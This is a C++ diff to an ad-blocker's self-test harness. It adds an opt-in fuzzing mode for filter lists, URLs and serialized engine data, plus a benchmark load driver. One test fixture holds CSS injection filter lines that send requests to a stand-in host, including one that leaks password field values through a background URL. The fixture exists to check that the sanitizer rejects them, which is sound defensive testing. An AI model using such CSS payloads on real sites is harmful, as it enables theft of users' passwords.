@@ -9,6 +9,8 @@
 #include <time.h>
 
 #include <algorithm>
+#include <atomic>
+#include <cmath>
 #include <cstdio>
 #include <cstdlib>
 #include <map>
@@ -22,16 +24,19 @@
 #include "base/base64.h"
 #include "base/command_line.h"
 #include "base/files/file_util.h"
+#include "base/functional/bind.h"
 #include "base/json/json_writer.h"
 #include "base/location.h"
 #include "base/task/single_thread_task_runner.h"
 #include "base/strings/string_split.h"
 #include "base/task/thread_pool.h"
+#include "base/task/task_traits.h"
 #include "base/threading/platform_thread.h"
 #include "base/strings/string_number_conversions.h"
 #include "base/strings/string_util.h"
 #include "base/timer/elapsed_timer.h"
 #include "base/values.h"
+#include "crypto/hash.h"
 #include "net/base/registry_controlled_domains/registry_controlled_domain.h"
 #include "open/adblock/open_adblock_matcher.h"
 #include "open/adblock/open_adblock_service.h"
@@ -276,8 +281,7 @@ std::vector<std::string> CodePoints(std::string_view text) {
 // The round 1 reviewer's fuzz (same xorshift seed and alphabet), cut to fit
 // the self-test's 10 s: mutated list lines (build, cosmetic, hidden
 // selectors, check, serialize, deserialize), mutated URLs with every request
-// type, and mutated DATs. Passing means no abort; the full-size runs are a
-// pre-release follow-up (docs/followups.md).
+// type, and mutated DATs. The opt-in full-size mode below has no watchdog.
 bool Fuzz() {
   const char* const seeds[] = {
       "||ads.example.com^$third-party",
@@ -552,6 +556,372 @@ bool CheckShim() {
 }
 
 // Review R2-5: what each extra load's |done| received.
+// Opt-in browser-process parser corpus. This uses the production CXX shim,
+// not a separate parser or a mock. The ordinary smoke corpus stays bounded.
+constexpr uint64_t kFullFuzzSeed = 0x9e3779b97f4a7c15;
+
+std::string FullFuzzLoad() {
+  double loads[3] = {};
+  if (getloadavg(loads, 3) != 3) {
+    return "unavailable";
+  }
+  return std::to_string(loads[0]) + "/" + std::to_string(loads[1]) + "/" +
+         std::to_string(loads[2]);
+}
+
+struct FullFuzzCounts {
+  uint64_t accepted = 0;
+  uint64_t rejected = 0;
+  void Record(bool accept) {
+    if (accept) {
+      ++accepted;
+    } else {
+      ++rejected;
+    }
+  }
+  void Print(std::string_view kind) const {
+    Line("fuzz-full kind=" + std::string(kind) +
+         " accepted=" + std::to_string(accepted) +
+         " rejected=" + std::to_string(rejected) +
+         " total=" + std::to_string(accepted + rejected) +
+         " load=" + FullFuzzLoad());
+  }
+};
+
+class FullFuzzInput {
+ public:
+  explicit FullFuzzInput(base::FilePath directory)
+      : directory_(std::move(directory)) {}
+
+  bool Save(std::string_view kind,
+            uint64_t index,
+            uint64_t state,
+            std::string_view input,
+            std::string_view context = {}) const {
+    // Close both files before entering a parser. A process panic leaves the
+    // exact active bytes and replay coordinates, not the following input.
+    const std::string metadata =
+        "seed=0x9e3779b97f4a7c15\nkind=" + std::string(kind) +
+        "\nindex=" + std::to_string(index) +
+        "\nrng_state=" + std::to_string(state) +
+        "\nbytes=" + std::to_string(input.size()) +
+        "\nsha256=" + base::HexEncodeLower(crypto::hash::Sha256(input)) +
+        "\n" + std::string(context) + "\n";
+    if (!base::WriteFile(directory_.AppendASCII("current.input"), input) ||
+        !base::WriteFile(directory_.AppendASCII("current.meta"), metadata)) {
+      Line("FAIL fuzz-full cannot preserve active input");
+      return false;
+    }
+    return true;
+  }
+
+ private:
+  const base::FilePath directory_;
+};
+
+std::string FullFuzzMutate(std::string_view input, Rng& rng) {
+  static const std::vector<std::string> alphabet = {
+      "$", "#", "@", "|", "^", "*", "/", "\\", ",", "=", "~", "!", ":", "(",
+      ")", "[", "]", "{", "}", "+", ".", "-", "_", " ", std::string(1, '\0'),
+      "\xc2\xa0", "\xc3\xa9", "\xf0\x9d\x94\x98", "\xe2\x80\x8b",
+      "\xc4\xb1", "\xef\xbf\xbd", "\xc4\xb0", "\xc3\x9f", "%", "?", "&",
+      ";", "'", "\"", "<", ">"};
+  // With an 8-MiB seed cap and eight insertions, capacity is at most
+  // 16 Mi elements: at most 512 MiB, below PartitionAlloc's 2-GiB ceiling.
+  // Actual pinned lines/resources are much smaller. No unbounded expansion.
+  static_assert(sizeof(std::string) <= 32);
+  std::vector<std::string> chars = CodePoints(input);
+  const size_t operations = 1 + rng.Below(8);
+  for (size_t operation = 0; operation < operations; ++operation) {
+    const size_t kind = rng.Below(4);
+    const size_t at = rng.Below(chars.size() + 1);
+    const auto& inserted = alphabet[rng.Below(alphabet.size())];
+    if (kind == 0) {
+      chars.insert(chars.begin() + at, inserted);
+    } else if (kind == 1 && at < chars.size()) {
+      chars.erase(chars.begin() + at);
+    } else if (kind == 2) {
+      chars.resize(at);
+    } else if (at < chars.size()) {
+      chars[at] = inserted;
+    }
+  }
+  return base::JoinString(chars, "");
+}
+
+bool RunFullFuzz(base::FilePath input_root, base::FilePath output,
+                 bool data_only) {
+  if (output.empty() || !base::CreateDirectory(output)) {
+    Line("FAIL fuzz-full needs --open-adblock-fuzz-output=<private directory>");
+    return false;
+  }
+  base::ElapsedTimer duration;
+  // Data-only starts at the same printed seed and skips list mutations/URLs.
+  Rng rng{kFullFuzzSeed};
+  constexpr uint64_t kDataMutations = 30000;
+  FullFuzzInput active(output);
+  Line("fuzz-full seed=0x9e3779b97f4a7c15 mode=" +
+       std::string(data_only ? "data-only" : "full") +
+       " watchdog=none load=" + FullFuzzLoad() +
+       " active_input=" + output.AppendASCII("current.input").value());
+  Line("fuzz-full counts: list=shim admission (per-rule parse failures are "
+       "not exposed); URL=crate Request parse; DAT=deserialize; "
+       "resources=nonempty typed JSON parse; CSS=sanitized output");
+
+  std::string easylist, easyprivacy, resources, urls;
+  const auto read = [&](const char* name, std::string& text) {
+    // These are trusted pinned seeds, still bounded before allocation.
+    // Largest seed string allocation: 8 MiB. Mutations add at most 32 bytes.
+    const bool ok = base::ReadFileToStringWithMaxSize(
+        input_root.AppendASCII(name), &text, 8 * 1024 * 1024);
+    if (ok) {
+      Line("fuzz-full input=" + std::string(name) +
+           " bytes=" + std::to_string(text.size()) +
+           " sha256=" + base::HexEncodeLower(crypto::hash::Sha256(text)));
+    }
+    return ok;
+  };
+  if (!read("easylist.txt", easylist) ||
+      !read("easyprivacy.txt", easyprivacy) ||
+      !read("resources.json", resources) ||
+      (!data_only && !read("corpus.txt", urls))) {
+    Line("FAIL fuzz-full cannot read pinned seeds");
+    return false;
+  }
+  auto line_seeds = base::SplitStringPiece(
+      easylist, "\n", base::KEEP_WHITESPACE, base::SPLIT_WANT_NONEMPTY);
+  const auto privacy_seeds = base::SplitStringPiece(
+      easyprivacy, "\n", base::KEEP_WHITESPACE, base::SPLIT_WANT_NONEMPTY);
+  line_seeds.insert(line_seeds.end(), privacy_seeds.begin(), privacy_seeds.end());
+  auto url_seeds = base::SplitStringPiece(
+      urls, "\n", base::TRIM_WHITESPACE, base::SPLIT_WANT_NONEMPTY);
+  for (std::string_view seed : {"http://[::1]:80/x", "https://a.b/",
+                                "https://example.com:99999/", "data:text/html,x",
+                                "https://xn--e1afmkfd.xn--p1ai/", "ws://a.b/"}) {
+    url_seeds.push_back(seed);
+  }
+  if (line_seeds.empty() || url_seeds.empty()) {
+    Line("FAIL fuzz-full empty seed corpus");
+    return false;
+  }
+
+  uint64_t builds = 0;
+  double slowest_build_ms = 0;
+  std::string slowest_kind;
+  uint64_t slowest_index = 0;
+  const auto build = [&](const std::vector<std::string>& lists,
+                         std::string_view json,
+                         std::string_view kind, uint64_t index) {
+    rust::Vec<rust::String> texts;
+    for (const auto& text : lists) {
+      texts.push_back(rust::String::lossy(text));
+    }
+    base::ElapsedTimer timer;
+    auto engine = open_adblock::open_adblock_build(
+        rust::Slice<const rust::String>(texts.data(), texts.size()),
+        rust::Str(json.data(), json.size()));
+    const double ms = timer.Elapsed().InMillisecondsF();
+    ++builds;
+    if (ms > slowest_build_ms) {
+      slowest_build_ms = ms;
+      slowest_kind = kind;
+      slowest_index = index;
+    }
+    return engine;
+  };
+  const auto progress = [](std::string_view kind, uint64_t count) {
+    Line("fuzz-full progress=" + std::string(kind) +
+         " count=" + std::to_string(count) + " load=" + FullFuzzLoad());
+  };
+
+  FullFuzzCounts lines;
+  for (uint64_t i = 0; i < (data_only ? 0u : 150000u); ++i) {
+    const std::string text = FullFuzzMutate(line_seeds[rng.Below(line_seeds.size())], rng);
+    if (!active.Save("list", i, rng.state, text)) {
+      return false;
+    }
+    auto engine = build({text}, {}, "list", i);
+    lines.Record(open_adblock::open_adblock_build_report(*engine).refused.empty());
+    if ((i + 1) % 5000 == 0) progress("list", i + 1);
+  }
+  if (!data_only) lines.Print("list");
+
+  // Keep the real two-list engine for URL checks and serialize that engine,
+  // rather than mutating the tiny synthetic DAT used by the smoke corpus.
+  const std::string joined = easylist + easyprivacy;
+  if (!active.Save("real-list-build", 0, rng.state, joined,
+                   "easylist_bytes=" + std::to_string(easylist.size()) +
+                       "\nresources=resources.json (pinned seed above)")) {
+    return false;
+  }
+  auto real = build({easylist, easyprivacy}, resources, "real-list-build", 0);
+  const auto report = open_adblock::open_adblock_build_report(*real);
+  if (!report.refused.empty() || report.list_count != 2 ||
+      !report.resources_error.empty() || report.resources_loaded == 0) {
+    Line("FAIL fuzz-full pinned engine build");
+    return false;
+  }
+  rust::Vec<uint8_t> serialized = open_adblock::open_adblock_serialize(*real);
+  const std::vector<uint8_t> valid(serialized.begin(), serialized.end());
+  if (valid.size() <= 5 || valid.size() > 64 * 1024 * 1024) {
+    Line("FAIL fuzz-full real DAT outside 6-byte to 64-MiB seed bound");
+    return false;
+  }
+  if (!base::WriteFile(output.AppendASCII("real.dat"),
+                       std::string_view(reinterpret_cast<const char*>(valid.data()), valid.size()))) {
+    Line("FAIL fuzz-full cannot retain real DAT");
+    return false;
+  }
+  Line("fuzz-full real_dat_bytes=" + std::to_string(valid.size()) +
+       " lossless=" + std::to_string(report.lossless));
+  if (!active.Save("DAT-control", 0, rng.state,
+                   std::string_view(reinterpret_cast<const char*>(valid.data()), valid.size())) ||
+      !Deserialize(valid)) {
+    Line("FAIL fuzz-full real DAT control");
+    return false;
+  }
+
+  FullFuzzCounts requests;
+  uint64_t matched = 0;
+  for (uint64_t i = 0; i < (data_only ? 0u : 100000u); ++i) {
+    const std::string url = FullFuzzMutate(url_seeds[rng.Below(url_seeds.size())], rng);
+    const auto type = static_cast<OpenRequestType>(rng.Below(14));
+    if (!active.Save("URL", i, rng.state, url,
+                     "source=https://example.com/\ntype=" +
+                         std::to_string(static_cast<int>(type)) +
+                         "\ncap=" + std::to_string(kOpenAdBlockMatchCapBytes))) {
+      return false;
+    }
+    const auto result = open_adblock::open_adblock_check(
+        *real, rust::String::lossy(url), "https://example.com/", type,
+        kOpenAdBlockMatchCapBytes);
+    requests.Record(result.request_valid);
+    matched += result.matched;
+    if ((i + 1) % 10000 == 0) progress("URL", i + 1);
+  }
+  if (!data_only) {
+    requests.Print("URL");
+    Line("fuzz-full URL matched=" + std::to_string(matched));
+  }
+
+  FullFuzzCounts four_byte;
+  if (!data_only) {
+    const std::vector<uint8_t> magic = {0xd1, 0xd9, 0x3a, 0xaf};
+    if (!active.Save("DAT-4-byte", 0, rng.state,
+                     std::string_view(reinterpret_cast<const char*>(magic.data()), magic.size()))) {
+      return false;
+    }
+    four_byte.Record(Deserialize(magic));
+    four_byte.Print("DAT-4-byte");
+    if (four_byte.accepted) {
+      Line("FAIL fuzz-full four-byte DAT accepted");
+      return false;
+    }
+  }
+  FullFuzzCounts dats;
+  for (uint64_t i = 0; i < kDataMutations; ++i) {
+    std::vector<uint8_t> dat = valid;
+    switch (rng.Below(5)) {
+      case 0:
+        dat.resize(rng.Below(dat.size()));
+        break;
+      case 1:
+        for (size_t n = 1 + rng.Below(8); n; --n) {
+          dat[rng.Below(dat.size())] ^= static_cast<uint8_t>(1u << rng.Below(8));
+        }
+        break;
+      case 2:
+        dat[5 + rng.Below(dat.size() - 5)] = 0xdb;
+        break;
+      case 3: {
+        const size_t at = rng.Below(dat.size());
+        const size_t count = 1 + rng.Below(16);
+        const uint8_t value = static_cast<uint8_t>(rng.Next());
+        dat.insert(dat.begin() + at, count, value);
+        break;
+      }
+      default:
+        dat.push_back(static_cast<uint8_t>(rng.Next()));
+        break;
+    }
+    if (!active.Save("DAT-mutation", i, rng.state,
+                     std::string_view(reinterpret_cast<const char*>(dat.data()), dat.size()))) {
+      return false;
+    }
+    dats.Record(Deserialize(dat));
+    if ((i + 1) % 100 == 0) progress("DAT-mutation", i + 1);
+  }
+  dats.Print("DAT-mutation");
+
+  FullFuzzCounts resource_inputs;
+  for (uint64_t i = 0; i < kDataMutations; ++i) {
+    std::string json = FullFuzzMutate(resources, rng);
+    if (json.empty()) json = "[";  // Exercise serde_json, not the no-file path.
+    if (!active.Save("resources", i, rng.state, json)) {
+      return false;
+    }
+    auto engine = build({}, json, "resources", i);
+    const auto parsed = open_adblock::open_adblock_build_report(*engine);
+    resource_inputs.Record(parsed.resources_error.empty() && parsed.resources_loaded > 0);
+    if ((i + 1) % 100 == 0) progress("resources", i + 1);
+  }
+  resource_inputs.Print("resources");
+
+  FullFuzzCounts css_output;
+  if (!data_only) {
+    // Exact review 98-2 injection lines, with two positive selector controls.
+    const std::vector<std::string> css = {
+        "example.com##x{} input[type=password][value^=\"a\"]{background:url(https://evil.test/a)} y",
+        "example.com##.banner:style(background: url(https://evil.test/p.gif) !important)",
+        "example.com##.box:style(color: red } body { background: url(https://evil.test/q) )",
+        "example.com##.plain-ad", "example.com##div[style^=\"z-index: 9;\"]"};
+    if (!active.Save("CSS-review", 0, rng.state, base::JoinString(css, "\n"))) {
+      return false;
+    }
+    auto injected = build(css, {}, "CSS-review", 0);
+    const auto cosmetic = open_adblock::open_adblock_cosmetic(*injected, "https://example.com/");
+    css_output.accepted = cosmetic.hide_selectors.size();
+    css_output.rejected = cosmetic.dropped_unsafe + cosmetic.dropped_style;
+    css_output.Print("CSS-review");
+    bool clean = true;
+    for (const auto& selector : cosmetic.hide_selectors) {
+      clean &= IsCleanSelector(std::string(selector));
+    }
+    if (!clean || css_output.accepted != 2 || cosmetic.dropped_unsafe != 1 ||
+        cosmetic.dropped_style != 2) {
+      Line("FAIL fuzz-full CSS injection crossed the bridge");
+      return false;
+    }
+  }
+
+  task_vm_info_data_t memory{};
+  mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
+  if (task_info(mach_task_self(), TASK_VM_INFO, reinterpret_cast<task_info_t>(&memory),
+                &count) != KERN_SUCCESS || count < TASK_VM_INFO_REV3_COUNT ||
+      memory.ledger_phys_footprint_peak <= 0) {
+    Line("FAIL fuzz-full peak phys_footprint unavailable");
+    return false;
+  }
+  Line("fuzz-full summary PASS seed=0x9e3779b97f4a7c15 mode=" +
+       std::string(data_only ? "data-only" : "full") +
+       " lines=" + std::to_string(lines.accepted + lines.rejected) +
+       " urls=" + std::to_string(requests.accepted + requests.rejected) +
+       " dat_mutations=" + std::to_string(dats.accepted + dats.rejected) +
+       " resources=" + std::to_string(resource_inputs.accepted + resource_inputs.rejected) +
+       " dat_4_byte_rejected=" + std::to_string(four_byte.rejected) +
+       " css_rejected=" + std::to_string(css_output.rejected) +
+       " css_controls=" + std::to_string(css_output.accepted) +
+       " builds=" + std::to_string(builds) +
+       " slowest_build_ms=" + std::to_string(slowest_build_ms) +
+       " slowest_kind=" + slowest_kind +
+       " slowest_index=" + std::to_string(slowest_index) +
+       " duration_ms=" + std::to_string(duration.Elapsed().InMilliseconds()) +
+       " phys_footprint=" + std::to_string(memory.phys_footprint) +
+       " peak_phys_footprint=" + std::to_string(memory.ledger_phys_footprint_peak) +
+       " load=" + FullFuzzLoad());
+  return true;
+}
+
 struct LoadResults {
   std::optional<AdBlockLoadResult> destroyed;
   std::optional<AdBlockLoadResult> after_shutdown;
@@ -739,6 +1109,100 @@ std::vector<BenchItem> ReadBenchFile(base::FilePath path) {
     }
   }
   return items;
+}
+
+// Non-official C-G2 harness: the off Profile still has a loaded engine.
+// Pace on UI, but enqueue exactly one task per check on the normal matcher
+// runner. Neither synthetic checks nor a file read execute on UI.
+struct BenchLoadState {
+  std::vector<BenchItem> items;
+  double rate = 0;
+  base::TimeTicks start;
+  base::TimeTicks last_log;
+  uint64_t posted = 0;  // UI only.
+  std::atomic<uint64_t> checks{0};
+  std::atomic<uint32_t> pending{0};
+};
+
+std::atomic<uint64_t> g_bench_load_checks{0};
+std::atomic<bool> g_bench_load_started{false};
+
+void PumpBenchLoad(base::WeakPtr<OpenAdBlockService> service,
+                   std::shared_ptr<BenchLoadState> state) {
+  if (!service) {
+    fprintf(stderr, "OpenAdBlockBenchLoad: stopped checks=%llu\n",
+            static_cast<unsigned long long>(state->checks.load()));
+    return;
+  }
+  const auto now = base::TimeTicks::Now();
+  const uint64_t due =
+      static_cast<uint64_t>((now - state->start).InSecondsF() * state->rate);
+  while (state->posted < due && state->pending.load() < 1000) {
+    const size_t index = state->posted++ % state->items.size();
+    state->pending.fetch_add(1);
+    AdBlockMatcherTaskRunner()->PostTask(
+        FROM_HERE, base::BindOnce(
+                       [](scoped_refptr<OpenAdBlockMatcher> matcher,
+                          std::shared_ptr<BenchLoadState> state, size_t index) {
+                         const auto& item = state->items[index];
+                         matcher->Check(item.url, item.source, item.type,
+                                        kOpenAdBlockMatchCapBytes);
+                         state->checks.fetch_add(1);
+                         g_bench_load_checks.fetch_add(1);
+                         state->pending.fetch_sub(1);
+                       },
+                       service->matcher(), state, index));
+  }
+  if (now - state->last_log >= base::Seconds(1)) {
+    fprintf(stderr,
+            "OpenAdBlockBenchLoad: rate=%.3f elapsed_s=%.3f checks=%llu "
+            "posted=%llu pending=%u\n",
+            state->rate, (now - state->start).InSecondsF(),
+            static_cast<unsigned long long>(state->checks.load()),
+            static_cast<unsigned long long>(state->posted),
+            state->pending.load());
+    state->last_log = now;
+  }
+  base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
+      FROM_HERE, base::BindOnce(&PumpBenchLoad, service, std::move(state)),
+      base::Milliseconds(1));
+}
+
+void StartBenchLoad(base::WeakPtr<OpenAdBlockService> service) {
+  const auto* command_line = base::CommandLine::ForCurrentProcess();
+  if (!command_line->HasSwitch("open-adblock-bench-load")) {
+    return;
+  }
+  double rate = 0;
+  if (!base::StringToDouble(
+          command_line->GetSwitchValueASCII("open-adblock-bench-load-rate"),
+          &rate) ||
+      !std::isfinite(rate) || rate <= 0 || rate > 1000000) {
+    fprintf(stderr, "OpenAdBlockBenchLoad: FAIL invalid rate\n");
+    return;
+  }
+  AdBlockBuildTaskRunner()->PostTaskAndReplyWithResult(
+      FROM_HERE,
+      base::BindOnce(&ReadBenchFile, command_line->GetSwitchValuePath(
+                                         "open-adblock-bench-load")),
+      base::BindOnce(
+          [](base::WeakPtr<OpenAdBlockService> service, double rate,
+             std::vector<BenchItem> items) {
+            if (!service || items.empty()) {
+              fprintf(stderr, "OpenAdBlockBenchLoad: FAIL no live corpus\n");
+              return;
+            }
+            auto state = std::make_shared<BenchLoadState>();
+            state->items = std::move(items);
+            state->rate = rate;
+            state->start = state->last_log = base::TimeTicks::Now();
+            g_bench_load_started.store(true);
+            fprintf(stderr,
+                    "OpenAdBlockBenchLoad: started rate=%.3f urls=%zu\n", rate,
+                    state->items.size());
+            PumpBenchLoad(service, std::move(state));
+          },
+          service, rate));
 }
 
 // Repetition 1 is warm-up (a first regex compile can take 6.78 ms, F-35):
@@ -1333,6 +1797,17 @@ void RunOpenAdBlockSelftest(OpenAdBlockService* service,
                             base::FilePath adblock_root,
                             base::OnceCallback<void(bool)> done) {
   const auto& command = *base::CommandLine::ForCurrentProcess();
+  if (command.HasSwitch("open-adblock-fuzz-full")) {
+    // Opt-in, headless, no watchdog. Do not load the service or consume its
+    // shared matcher sequence. The process is also launched with nice(19).
+    base::ThreadPool::PostTaskAndReplyWithResult(
+        FROM_HERE, {base::MayBlock(), base::TaskPriority::BEST_EFFORT},
+        base::BindOnce(&RunFullFuzz, adblock_root,
+                       command.GetSwitchValuePath("open-adblock-fuzz-output"),
+                       command.HasSwitch("open-adblock-fuzz-data-only")),
+        std::move(done));
+    return;
+  }
   if (command.HasSwitch("open-adblock-idle-off-proof")) {
     // Headless blocking-off control: do not load an engine or run checks.
     // Use the same process CPU/count observer as the post-corpus idle proof.
@@ -1401,6 +1876,7 @@ void RunOpenAdBlockSelftest(OpenAdBlockService* service,
 std::string AdBlockStatusText(const AdBlockStatus& status) {
   return "enabled=" + std::to_string(status.enabled) +
          " engine_loaded=" + std::to_string(status.engine_loaded) +
+         " awaiting_generation=" + std::to_string(status.awaiting_generation) +
          " engine_from_dat=" + std::to_string(status.engine_from_dat) +
          " engine_shared=" + std::to_string(status.engine_shared) +
          " generation=" + std::to_string(status.generation) +
@@ -1411,6 +1887,8 @@ std::string AdBlockStatusText(const AdBlockStatus& status) {
          " match_cap_bytes=" + std::to_string(status.match_cap_bytes) +
          " checks=" + std::to_string(status.checks) +
          " checks_truncated=" + std::to_string(status.checks_truncated) +
+         " cold_holds=" + std::to_string(status.cold_holds) +
+         " cold_hold_max_ms=" + std::to_string(status.cold_hold_max_ms) +
          " last_build_ms=" + std::to_string(status.last_build_ms) +
          " last_error=\"" + status.last_error + "\"" +
          " excluded=" + base::JoinString(status.excluded_domains, ",");
@@ -1427,10 +1905,14 @@ void LoadOpenAdBlockForSmoke(OpenAdBlockService* service,
               return;
             }
             static constexpr const char* kNames[] = {"loaded", "failed",
-                                                     "stale", "cancelled"};
+                                                     "stale", "cancelled",
+                                                     "awaiting_generation"};
             fprintf(stderr, "OpenAdBlockSmoke: load result=%s %s\n",
                     kNames[static_cast<int>(result)],
                     AdBlockStatusText(service->GetStatus()).c_str());
+            if (result == AdBlockLoadResult::kLoaded) {
+              StartBenchLoad(service);
+            }
           },
           service->GetWeakPtr()));
 }
@@ -1438,6 +1920,13 @@ void LoadOpenAdBlockForSmoke(OpenAdBlockService* service,
 void RecordOpenAdBlockMemoryPhase(const char* phase) {
   if (base::CommandLine::ForCurrentProcess()->HasSwitch("open-adblock-diagnostic")) {
     MemorySnapshot(phase);
+  }
+}
+
+void PrintOpenAdBlockBenchLoadCount() {
+  if (g_bench_load_started.load()) {
+    fprintf(stderr, "OpenAdBlockBenchLoad: shutdown_checks=%llu\n",
+            static_cast<unsigned long long>(g_bench_load_checks.load()));
   }
 }
 
